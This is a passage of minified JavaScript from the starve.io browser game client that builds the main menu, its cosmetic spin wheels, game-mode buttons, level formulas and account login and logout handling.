                        position: o | a,
                        view: A,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: -122,
                            _y: 110
                        }
                    },
                    window.innerWidth < 1300 ? this.server_list = {
                        id: document.getElementById("servselect"),
                        style: document.getElementById("servselect").style,
                        active: z,
                        position: o | i,
                        view: d,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: 208,
                            _y: 225
                        }
                    } : this.server_list = {
                        id: document.getElementById("servselect"),
                        style: document.getElementById("servselect").style,
                        active: z,
                        position: o | a,
                        view: d,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: -180,
                            _y: 225
                        }
                    },
                    this.leaderboard = {
                        id: document.getElementById("leaderboard"),
                        style: document.getElementById("leaderboard").style,
                        active: P,
                        position: o | a,
                        view: O,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: -294.5,
                            _y: 190
                        }
                    },
                    this.stats_box = {
                        id: document.getElementById("stats_box"),
                        style: document.getElementById("stats_box").style,
                        active: P,
                        position: o | a,
                        view: A,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: 125,
                            _y: 187
                        }
                    },
                    this.serverAddressBlock = {
                        id: document.getElementById("serverAddressBlock"),
                        style: document.getElementById("serverAddressBlock").style,
                        input: document.getElementById("serverAddressInput"),
                        active: P,
                        position: o | a,
                        view: m,
                        translate: {
                            x: 0,
                            y: 0,
                            _x: -220,
                            _y: 350
                        }
                    },
                    e = 0,
                    this.css = [],
                    this.css[e++] = this.nickname,
                    this.css[e++] = this.server_list,
                    this.css[e++] = this.leaderboard,
                    this.css[e++] = this.account_nickname,
                    this.css[e++] = this.stats_box,
                    this.css[e++] = this.serverAddressBlock,
                    e = 0,
                    this.bkgd = [],
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_RESUME, z, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL1, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL2, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL3, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL4, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL5, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL6, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL7, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL8, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL9, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL10, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL11, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL12, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL13, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL14, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL15, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL16, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL17, P, 0, 0, i),
                    this.bkgd[e++] = Ne(IMAGES.AVATAR_LVL18, P, 0, 0, i),
                    window.innerWidth < 1300 ? this.bkgd[e] = Ne(IMAGES.LOGO_INTERFACE, z, 200, 100, o | i) : this.bkgd[e] = Ne(IMAGES.LOGO_INTERFACE, z, -753 / 4, 100, o | a),
                    this.bkgd[e++].view = d,
                    this.bkgd[e++] = Ne(IMAGES.LINKS_BG, z, 353, -10, r),
                    1300 < window.innerWidth && (this.bkgd[e] = Ne(IMAGES.CHANGELOG_BOX, z, -885 / 4, -159.5, ne | a),
                        this.bkgd[e++].view = d),
                    this.bkgd[e] = Ne(IMAGES.PROFILE_BOX, P, -323.25, 100, o | a),
                    this.bkgd[e++].view = A,
                    this.bkgd[e] = Ne(IMAGES.SKINS_BOX, P, -356.25, 100, o | a),
                    this.bkgd[e++].view = l,
                    this.bkgd[e] = Ne(IMAGES.ACCOUNT_BOX, P, -905 / 4, 50, o | a),
                    this.bkgd[e++].view = h,
                    this.bkgd[e] = Ne(IMAGES.SHOP_BOX, P, -402, 130, o | a),
                    this.bkgd[e++].view = I,
                    this.bkgd[e] = Ne(IMAGES.SERVER_LOCATION_BOX, P, -279.25, 130, o | a),
                    this.bkgd[e++].view = S,
                    this.bkgd[e] = Ne(IMAGES.SERVER_DURATION_BOX, P, -305.5, 130, o | a),
                    this.bkgd[e++].view = ee,
                    this.bkgd[e] = Ne(IMAGES.SERVER_ACCESS_BOX, P, -305.5, 100, o | a),
                    this.bkgd[e++].view = m,
                    this.bkgd[e] = Ne(IMAGES.SEASON5_BOX, P, -IMAGES.SEASON5_BOX.width / 4 - 350, -15, o | a),
                    this.bkgd[e++].view = te,
                    this.bkgd[e] = Ne(IMAGES.TUTORIAL_BOX, P, -374.25, 110, o | a),
                    this.bkgd[e++].view = c,
                    this.bkgd[e] = Ne(IMAGES.LEADERBOARD_BOX, P, -306.5, 100, o | a),
                    this.bkgd[e++].view = O,
                    this.bkgd[e] = Ne(IMAGES.BUY_BREAD_BOX, P, -345.25, 80, o | a),
                    this.bkgd[e++].view = t,
                    this.bkgd[e] = Ne(IMAGES.SPIN1, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = x,
                    this.create_spin([["#25c5d6", 10.8], ["#e2cf27", 36], ["#afac98", 108], ["#d88e23", 57 * 3.6]])), oe = (this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                        this.bkgd[e++].view = x,
                        this.play_spin = function (e, t, i) {
                            T.spin = 1,
                                T.spin_effect = 0,
                                T.spin_win_effect = 0,
                                T.spin_target = e;
                            var n, r = 0;
                            if (0 === (T.spin_type = t)) {
                                for (r = 0; r < COSMETICS.SKIN.length && i !== COSMETICS.SKIN[r].id; r++)
                                    ;
                                n = COSMETICS.SKIN[r],
                                    T.unlock.skin[r] = 1
                            } else if (1 === t) {
                                for (r = 0; r < COSMETICS.ACCESSORY.length && i !== COSMETICS.ACCESSORY[r].id; r++)
                                    ;
                                n = COSMETICS.ACCESSORY[r],
                                    T.unlock.accessory[r] = 1
                            } else if (2 === t) {
                                for (r = 0; r < COSMETICS.BAG.length && i !== COSMETICS.BAG[r].id; r++)
                                    ;
                                n = COSMETICS.BAG[r],
                                    T.unlock.bag[r] = 1
                            } else if (3 === t) {
                                for (r = 0; r < COSMETICS.BOOK.length && i !== COSMETICS.BOOK[r].id; r++)
                                    ;
                                n = COSMETICS.BOOK[r],
                                    T.unlock.book[r] = 1
                            } else if (4 === t) {
                                for (r = 0; r < COSMETICS.CRATE.length && i !== COSMETICS.CRATE[r].id; r++)
                                    ;
                                n = COSMETICS.CRATE[r],
                                    T.unlock.crate[r] = 1,
                                    T.unlock.dead[r] = 1
                            }
                            T.spin_win = r,
                                T.spin_author = Qr("by " + n.author, "'Baloo Paaji', sans-serif", "#EFE4B4", 40, 500, void 0, 30, 24, void 0, void 0, void 0, void 0, "#000000", 24),
                                T.spin_name = Qr(n.name, "'Baloo Paaji', sans-serif", "#EFE4B4", 60, 600, void 0, 30, 24, void 0, void 0, void 0, void 0, "#000000", 20)
                        }
                        ,
                        this.spin = 0,
                        this.spin_effect = 0,
                        this.spin_target = 0,
                        this.spin_type = 0,
                        this.spin_win_effect = 0,
                        this.spin_author = void 0,
                        this.spin_name = void 0,
                        197);
                function _(e, t) {
                    if (void 0 !== t && (Se.profile_season = t,
                        t = Se.seasons[t],
                        Se.score = t.score,
                        Se.kill = t.kill,
                        Se.death = t.death,
                        Se.time = t.time,
                        Se.bestScore = t.bestScore,
                        Se.bestKill = t.bestKill,
                        Se.bestTime = t.bestTime,
                        Se.scoreTotal = t.scoreTotal),
                        void 0 === e && (e = Se.current_mode_score),
                        0 <= (Se.current_mode_score = e))
                        document.getElementById("stats_box_time").innerHTML = Se.bestTime[e],
                            document.getElementById("stats_box_kill").innerHTML = Se.bestKill[e],
                            document.getElementById("stats_box_score").innerHTML = Se.bestScore[e];
                    else {
                        for (var i = 0, n = 0; n < Se.kill.length; n++)
                            i += Se.kill[n];
                        for (var r = 0, n = 0; n < Se.time.length; n++)
                            r += Se.time[n];
                        document.getElementById("stats_box_time").innerHTML = r,
                            document.getElementById("stats_box_kill").innerHTML = i,
                            document.getElementById("stats_box_score").innerHTML = Se.score
                    }
                }
                this.bkgd[e] = Ne(IMAGES.SPIN2, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = q,
                    s = this.create_spin([["#d45ce5", 10.8], ["#25c5d6", 36], ["#e2cf27", 108], ["#afac98", 57 * 3.6]]),
                    this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                    this.bkgd[e++].view = q,
                    this.bkgd[e] = Ne(IMAGES.SPIN3, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = X,
                    s = this.create_spin([["#d33a2a", 10.8], ["#d45ce5", 36], ["#25c5d6", 108], ["#e2cf27", 57 * 3.6]]),
                    this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                    this.bkgd[e++].view = X,
                    this.bkgd[e] = Ne(IMAGES.SPIN4, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = j,
                    s = this.create_spin([["#25c5d6", 10.8], ["#e2cf27", 36], ["#afac98", 108], ["#d88e23", 57 * 3.6]]),
                    this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                    this.bkgd[e++].view = j,
                    this.bkgd[e] = Ne(IMAGES.SPIN5, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = J,
                    s = this.create_spin([["#d45ce5", 10.8], ["#25c5d6", 36], ["#e2cf27", 108], ["#afac98", 57 * 3.6]]),
                    this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                    this.bkgd[e++].view = J,
                    this.bkgd[e] = Ne(IMAGES.SPIN6, P, -385.5, 150, o | a),
                    this.bkgd[e++].view = Z,
                    s = this.create_spin([["#d33a2a", 10.8], ["#d45ce5", 36], ["#25c5d6", 108], ["#e2cf27", 57 * 3.6]]),
                    this.bkgd[e] = Ne(s, P, -s.width / 4, 178, o | a),
                    this.bkgd[e++].view = Z,
                    this.bkgd[e] = Ne(IMAGES.CUSTOM_SKIN_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = g,
                    this.bkgd[e] = Ne(IMAGES.ACCESSORIES_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = b,
                    this.bkgd[e] = Ne(IMAGES.BAG_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = R,
                    this.bkgd[e] = Ne(IMAGES.BOOK_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = C,
                    this.bkgd[e] = Ne(IMAGES.CRATE_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = p,
                    this.bkgd[e] = Ne(IMAGES.LOOT_BOX, P, -341.5, 100, o | a),
                    this.bkgd[e++].view = N,
                    BAG_REMAIN_BOX = e++,
                    this.bkgd[BAG_REMAIN_BOX] = Ne(IMAGES.BAG_REMAIN_BOX, P, 484, 0, o),
                    SERVER_REMAIN_BOX = e++,
                    this.bkgd[SERVER_REMAIN_BOX] = Ne(IMAGES.SERVER_REMAIN_BOX, P, 812.5, 0, o),
                    this.bkgd[e] = Ne(IMAGES.LOCKED_CUSTOM_ALERT, P, -189.5, -5, o | a),
                    this.bkgd[e++].view = F,
                    this.bkgd[e] = Ne(IMAGES.LOCKED_SKIN_ALERT, P, -189.5, -5, o | a),
                    this.bkgd[e++].view = Y,
                    LEVEL_GAUGE = e++,
                    this.bkgd[LEVEL_GAUGE] = Ne(IMAGES.GAUGE, z, 93, 30, o),
                    this.bkgd[e] = Ne(IMAGES.CHANGE_NICKNAME1_BOX, P, -173, 110, o | a),
                    this.bkgd[e++].view = Q,
                    this.bkgd[e] = Ne(IMAGES.CHANGE_NICKNAME0_BOX, P, -173, 110, o | a),
                    this.bkgd[e++].view = $,
                    e = 0,
                    this.buttons = [],
                    this.buttons[e++] = be(50, 57, 0, [IMAGES.BUY_BREAD_OUT, IMAGES.BUY_BREAD_IN, IMAGES.BUY_BREAD_CLICK], 1, 0, function () {
                        T.isUserLogged() ? v(t) : v(h)
                    }, 320, 0, i, z),
                    window.innerWidth < 1300 ? this.buttons[e] = be(202, 97, 0, [IMAGES.PLAY_BUTTON_OUT, IMAGES.PLAY_BUTTON_IN, IMAGES.PLAY_BUTTON_CLICK], 1, 0, this.play_game, 462, 235, o | i, z) : this.buttons[e] = be(202, 97, 0, [IMAGES.PLAY_BUTTON_OUT, IMAGES.PLAY_BUTTON_IN, IMAGES.PLAY_BUTTON_CLICK], 1, 0, this.play_game, 74, 235, o | a, z),
                    this.buttons[e++].view = d,
                    1300 < window.innerWidth && (this.buttons[e] = be(355, 168, 0, [IMAGES.CHANGELOG_BUTTON_OUT, IMAGES.CHANGELOG_BUTTON_OUT, IMAGES.CHANGELOG_BUTTON_OUT], 1, 0, function () {
                        window.open("./changelog.html", "_blank")
                    }, -195, -115, ne | a, z),
                        this.buttons[e++].view = d,
                        this.buttons[e] = be(355, 168, 0, [IMAGES.DEVASTIO_BUTTON_OUT, IMAGES.DEVASTIO_BUTTON_OUT, IMAGES.DEVASTIO_BUTTON_OUT], 1, 0, function () {
                            window.open("https://devast.io", "_blank")
                        }, 20, -115, ne | a, z),
                        this.buttons[e++].view = d),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.DISCORD_BUTTON_OUT, IMAGES.DISCORD_BUTTON_IN, IMAGES.DISCORD_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://discord.gg/starveio", "_blank")
                    }, 330, 10, r, z),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.REDDIT_BUTTON_OUT, IMAGES.REDDIT_BUTTON_IN, IMAGES.REDDIT_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://reddit.com/r/starveio", "_blank")
                    }, 280, 10, r, z),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.WIKI_BUTTON_OUT, IMAGES.WIKI_BUTTON_IN, IMAGES.WIKI_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://starveiopro.wikia.com/wiki/", "_blank")
                    }, 230, 10, r, z),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.FACEBOOK_BUTTON_OUT, IMAGES.FACEBOOK_BUTTON_IN, IMAGES.FACEBOOK_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://www.facebook.com/pages/category/Video-Game/limaxio-571818073000979/", "_blank")
                    }, 155, 10, r, z),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.TWITTER_BUTTON_OUT, IMAGES.TWITTER_BUTTON_IN, IMAGES.TWITTER_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://twitter.com/lapamauve", "_blank")
                    }, 105, 10, r, z),
                    this.buttons[e++] = be(80, 80, 0, [IMAGES.YOUTUBE_BUTTON_OUT, IMAGES.YOUTUBE_BUTTON_IN, IMAGES.YOUTUBE_BUTTON_CLICK], 1, 0, function () {
                        window.open("https://youtube.com/c/lapamauve", "_blank")
                    }, 55, 10, r, z),
                    LEADERBOARD_BUTTON = e++,
                    this.buttons[LEADERBOARD_BUTTON] = be(232, 142, 0, [IMAGES.ICONS_BOTTOM_BG_BUTTON_OUT, IMAGES.ICONS_BOTTOM_BG_BUTTON_IN, IMAGES.ICONS_BOTTOM_BG_BUTTON_CLICK], 1, 0, function () {
                        v(O),
                            _o(Se.LEADERBOARD_ALL, Se.LEADERBOARD_TOTAL, Se.LEADERBOARD_SCORE, Se.LEADERBOARD_SEASON5)
                    }, -5, 573, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.LEADERBOARD_ICON, IMAGES.LEADERBOARD_ICON, IMAGES.LEADERBOARD_ICON], 1, 1, function () {
                        v(O)
                    }, -5, 566, i, z),
                    TUTORIAL_BUTTON = e++,
                    this.buttons[TUTORIAL_BUTTON] = be(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
                        v(c)
                    }, -5, 494, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.TUTORIAL_ICON, IMAGES.TUTORIAL_ICON, IMAGES.TUTORIAL_ICON], 1, 1, function () {
                        v(c)
                    }, -5, 494, i, z),
                    SERVER_BUTTON = e++,
                    this.buttons[SERVER_BUTTON] = be(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
                        T.isUserLogged() ? 0 < Se.privateServerTime - Date.now() && v(m) : v(h)
                    }, -5, 415, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.SERVER_ACCESS_ICON, IMAGES.SERVER_ACCESS_ICON, IMAGES.SERVER_ACCESS_ICON], 1, 1, function () {
                        T.isUserLogged() ? 0 < Se.privateServerTime - Date.now() && v(m) : v(h)
                    }, -5, 415, i, z),
                    SHOP_BUTTON = e++,
                    this.buttons[SHOP_BUTTON] = be(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, -5, 336, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.SHOP_ICON, IMAGES.SHOP_ICON, IMAGES.SHOP_ICON], 1, 1, function () {
                        v(I)
                    }, -5, 336, i, z),
                    COSMETICS_BUTTON = e++,
                    this.buttons[COSMETICS_BUTTON] = be(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -5, 257, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.SKINS_ICON, IMAGES.SKINS_ICON, IMAGES.SKINS_ICON], 1, 1, function () {
                        v(l)
                    }, -5, 257, i, z),
                    GAME_BUTTON = e++,
                    this.buttons[GAME_BUTTON] = be(236, 165, 0, [IMAGES.ICONS_BG_BUTTON_OUT, IMAGES.ICONS_BG_BUTTON_IN, IMAGES.ICONS_BG_BUTTON_CLICK], 1, 0, function () {
                        v(d)
                    }, -5, 178, i, z),
                    this.buttons[e++] = be(236, 165, 0, [IMAGES.START_ICON, IMAGES.START_ICON, IMAGES.START_ICON], 1, 1, function () {
                        v(d)
                    }, -5, 178, i, z),
                    LOGIN_BUTTON = e++,
                    this.LOGIN_BUTTON = LOGIN_BUTTON,
                    this.buttons[LOGIN_BUTTON] = be(324, 222, 0, [IMAGES.LOGIN_BUTTON_OUT, IMAGES.LOGIN_BUTTON_IN, IMAGES.LOGIN_BUTTON_CLICK], 1, 0, function () {
                        v(h)
                    }, 0, 70, i, z),
                    PROFILE_BUTTON = e++,
                    PROFILE_BUTTON_2 = e++,
                    this.PROFILE_BUTTON = PROFILE_BUTTON,
                    this.PROFILE_BUTTON_2 = PROFILE_BUTTON_2,
                    this.buttons[PROFILE_BUTTON] = be(324, 222, 0, [IMAGES.PROFILE_BUTTON_OUT, IMAGES.PROFILE_BUTTON_IN, IMAGES.PROFILE_BUTTON_CLICK], 1, 0, function () {
                        v(A),
                            _(-1)
                    }, 0, 70, i, P),
                    this.buttons[PROFILE_BUTTON_2] = be(324, 222, 0, [IMAGES.PROFILE_ICON, IMAGES.PROFILE_ICON, IMAGES.PROFILE_ICON], 1, 1, function () {
                        v(A),
                            _(-1)
                    }, 0, 70, i, P),
                    0 === client.privateServer && (M = e++,
                        window.innerWidth < 1300 ? this.buttons[M] = be(266, 176, 0, [IMAGES.NORMAL_MODE_OUT, IMAGES.NORMAL_MODE_IN, IMAGES.NORMAL_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_PVP)
                        }, 150, 300, i | o, z) : this.buttons[M] = be(266, 176, 0, [IMAGES.NORMAL_MODE_OUT, IMAGES.NORMAL_MODE_IN, IMAGES.NORMAL_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_PVP)
                        }, -340, 100, a | o, z),
                        this.buttons[M].view = d,
                        this.buttons[M].hint = 0,
                        f = e++,
                        window.innerWidth < 1300 ? this.buttons[f] = be(266, 176, 0, [IMAGES.FOREST_MODE_OUT, IMAGES.FOREST_MODE_IN, IMAGES.FOREST_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_LEGACY)
                        }, 150, 400, i | o, z) : this.buttons[f] = be(266, 176, 0, [IMAGES.FOREST_MODE_OUT, IMAGES.FOREST_MODE_IN, IMAGES.FOREST_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_LEGACY)
                        }, -340, 200, a | o, z),
                        this.buttons[f].view = d,
                        this.buttons[f].hint = 0,
                        L = e++,
                        window.innerWidth < 1300 ? this.buttons[L] = be(266, 176, 0, [IMAGES.MODE_COMMUNITY_OUT, IMAGES.MODE_COMMUNITY_IN, IMAGES.MODE_COMMUNITY_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_COMMUNITY)
                        }, 450, 300, i | o, z) : this.buttons[L] = be(266, 176, 0, [IMAGES.MODE_COMMUNITY_OUT, IMAGES.MODE_COMMUNITY_IN, IMAGES.MODE_COMMUNITY_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_COMMUNITY)
                        }, -340, 300, a | o, z),
                        this.buttons[L].view = d,
                        this.buttons[L].hint = 0,
                        G = e++,
                        window.innerWidth < 1300 ? this.buttons[G] = be(266, 176, 0, [IMAGES.ZOMBIE_MODE_OUT, IMAGES.ZOMBIE_MODE_IN, IMAGES.ZOMBIE_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_ZOMBIES)
                        }, 300, 300, i | o, z) : this.buttons[G] = be(266, 176, 0, [IMAGES.ZOMBIE_MODE_OUT, IMAGES.ZOMBIE_MODE_IN, IMAGES.ZOMBIE_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_ZOMBIES)
                        }, 204, 100, a | o, z),
                        this.buttons[G].view = d,
                        this.buttons[G].hint = 0,
                        y = e++,
                        window.innerWidth < 1300 ? this.buttons[y] = be(266, 176, 0, [IMAGES.VAMPIRE_MODE_OUT, IMAGES.VAMPIRE_MODE_IN, IMAGES.VAMPIRE_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_VAMPIRES)
                        }, 300, 400, i | o, z) : this.buttons[y] = be(266, 176, 0, [IMAGES.VAMPIRE_MODE_OUT, IMAGES.VAMPIRE_MODE_IN, IMAGES.VAMPIRE_MODE_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_VAMPIRES)
                        }, 204, 200, a | o, z),
                        this.buttons[y].view = d,
                        this.buttons[y].hint = 0,
                        H = e++,
                        this.buttons[H] = be(266, 176, 0, [IMAGES.MODE_EXPERIMENTAL_OUT, IMAGES.MODE_EXPERIMENTAL_IN, IMAGES.MODE_EXPERIMENTAL_CLICK], 1, 0, function () {
                            client.select_gamemode(Ue.MODE_EXPERIMENTAL)
                        }, window.innerWidth < 1300 ? 450 : 204, window.innerWidth < 1300 ? 400 : 300, (window.innerWidth < 1300 ? i : a) | o, z),
                        this.buttons[H].view = d,
                        this.buttons[H].hint = 0),
                    this.buttons[e] = be(87, 78, 0, [IMAGES.MODIFY_NAME_OUT, IMAGES.MODIFY_NAME_IN, IMAGES.MODIFY_NAME_CLICK], 1, 0, function () {
                        Se.generate_new_nickname(),
                            0 === Se.firstName ? v($) : v(Q)
                    }, 127, 110, a | o, P),
                    this.buttons[e++].view = A,
                    this.buttons[e] = be(87, 78, 0, [IMAGES.LOGOUT_OUT, IMAGES.LOGOUT_IN, IMAGES.LOGOUT_CLICK], 1, 0, function () {
                        K2 === k2 && window.FB.getUserID() && window.FB.logout(),
                            K2 === V2 && void 0 !== Z2 && (window.gapi.auth2.getAuthInstance().signOut(),
                                Z2 = void 0),
                            K2 = U2 = Y2 = void 0,
                            Se.kit = 0,
                            Se.bread = 0,
                            Se.score = 0,
                            Se.unlock_cosmetics(),
                            onUserLogout()
                    }, 255, 110, a | o, P),
                    this.buttons[e++].view = A,
                    this.buttons[e] = be(58, 64, 0, [IMAGES.CLOSE_BUTTON_OUT, IMAGES.CLOSE_BUTTON_IN, IMAGES.CLOSE_BUTTON_CLICK], 1, 0, function () {
                        v(d)
                    }, 189, 118, a | o, P),
                    this.buttons[e++].view = h,
                    this.buttons[e] = be(497, 72, 0, [IMAGES.LOGIN_GOOGLE_OUT, IMAGES.LOGIN_GOOGLE_IN, IMAGES.LOGIN_GOOGLE_CLICK], 1, 0, function () {
                        xe.alert.list.push("Soon")
                    }, -130, 390, a | o, P),
                    this.buttons[e++].view = h,
                    this.buttons[e] = be(497, 72, 0, [IMAGES.LOGIN_FACEBOOK_OUT, IMAGES.LOGIN_FACEBOOK_IN, IMAGES.LOGIN_FACEBOOK_CLICK], 1, 0, function () {
                        xe.alert.list.push("Soon")
                    }, -130, 430, a | o, P),
                    this.buttons[e++].view = h,
                    __LEVEL_FACTOR__ = 2e4,
                    this.xp_formula = function (e) {
                        var t = Se.level_formula(e)
                            , i = t * t * __LEVEL_FACTOR__;
                        return (e -= i) / ((t + 1) * (t + 1) * __LEVEL_FACTOR__ - i)
                    }
                    ,
                    this.level_formula = function (e) {
                        return Math.floor(Math.sqrt(e / __LEVEL_FACTOR__))
                    }
                    ,
                    this.update_score = function (e) {
                        Se.lvl = Se.level_formula(e),
                            Se.xp_dest = Se.xp_formula(e),
                            Se.xp = 0,
                            Se.score = e
                    }
                    ,
                    this.login_restore_data = function (e) {
                        Se.buttons[Se.LOGIN_BUTTON].info.active = 0,
                            Se.buttons[Se.PROFILE_BUTTON].info.active = 1,
                            Se.buttons[Se.PROFILE_BUTTON_2].info.active = 1,
                            w(),
                            -1 === e.name.indexOf("Starver#") ? document.getElementById("account_nickname_input").value = window.decodeURIComponent(window.escape(window.atob(e.name))) : document.getElementById("account_nickname_input").value = e.name,
                            Se.bread = e.bread;
                        var t = e.seasons
                            , i = t[t.length - 1];
                        Se.seasons = t,
                            T.update_score(i.score),
                            Se.score = i.score,
                            Se.kill = i.kill,
                            Se.death = i.death,
                            Se.time = i.time,
                            Se.bestScore = i.bestScore,
                            Se.bestKill = i.bestKill,
                            Se.bestTime = i.bestTime,
                            Se.scoreTotal = i.scoreTotal,
                            Se.firstName = e.firstName,
                            document.getElementById("serverAddressInput").value = "https://starve.io/?server=" + e.privateServer,
                            void 0 === Se.firstName && (Se.firstName = 0),
                            Se.privateServerTime = Date.now() + e.privateServerTime,
                            0 < Number(e.privateServerTime) && (Se.privateServerTime = Date.now() + Number(e.privateServerTime)),
                            Se.kit = Date.now() + e.kit,
                            0 < Number(e.kit) && (Se.kit = Date.now() + Number(e.kit));
                        for (var n = COSMETICS.SKIN, r = 0; r < e.skins.length; r++)
                            if (0 < e.skins[r])
                                for (var o = 0; o < n.length; o++)
                                    n[o].id === r && (T.unlock.skin[o] = 1);
                        for (n = COSMETICS.ACCESSORY,
                            r = 0; r < e.accessories.length; r++)
                            if (0 < e.accessories[r])
                                for (o = 0; o < n.length; o++)
                                    n[o].id === r && (T.unlock.accessory[o] = 1);
                        for (n = COSMETICS.BOOK,
                            r = 0; r < e.books.length; r++)
                            if (0 < e.books[r])
                                for (o = 0; o < n.length; o++)
                                    n[o].id === r && (T.unlock.book[o] = 1);
                        for (n = COSMETICS.BAG,
                            r = 0; r < e.bags.length; r++)
                            if (0 < e.bags[r])
                                for (o = 0; o < n.length; o++)
                                    n[o].id === r && (T.unlock.bag[o] = 1);
                        for (n = COSMETICS.CRATE,
                            r = 0; r < e.crates.length; r++)
                            if (0 < e.crates[r])
                                for (o = 0; o < n.length; o++)
                                    n[o].id === r && (T.unlock.crate[o] = 1,
                                        T.unlock.dead[o] = 1)
                    }
                    ,
                    this.login_after = function () {
                        window.onUserLogin = function () {
                            var e, t;
                            v(d),
                                e = T.login_restore_data,
                                (t = new XMLHttpRequest).open("GET", W2 + "login?token=" + U2 + "&type=" + K2),
                                t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
                                t.onreadystatechange = function () {
                                    4 === this.readyState && 200 === this.status && "0" !== t.responseText && e(JSON.parse(t.responseText))
                                }
                                ,
                                t.send()
                        }
                            ,
                            1 === F2 && window.onUserLogin()
                    }
                    ,
                    window.onUserLogout = function () {
                        Se.buttons[Se.LOGIN_BUTTON].info.active = 1,
                            Se.buttons[Se.PROFILE_BUTTON].info.active = 0,
                            Se.buttons[Se.PROFILE_BUTTON_2].info.active = 0,
                            v(d),
                            window.location = "https://starve.io"
                    }
                    ,
                    this.isUserLogged = function () {
                        return Se.buttons[Se.PROFILE_BUTTON].info.active
                    }
                    ,
                    this.buttons[e] = be(461, 105, 0, [IMAGES.GET_MORE_BUTTON_OUT, IMAGES.GET_MORE_BUTTON_IN, IMAGES.GET_MORE_BUTTON_CLICK], 1, 0, function () {
                        T.isUserLogged() ? v(t) : v(h)
                    }, -100, 80, a | o, P),
                    this.buttons[e++].view = I,
                    this.buttons[e] = be(157, 158, 0, [IMAGES.TUTO_WIKI_OUT, IMAGES.TUTO_WIKI_IN, IMAGES.TUTO_WIKI_CLICK], 1, 0, function () {
                        window.open("https://starveiopro.wikia.com/wiki/", "_blank")
                    }, -35, 125, a | o, P),
                    this.buttons[e++].view = c,
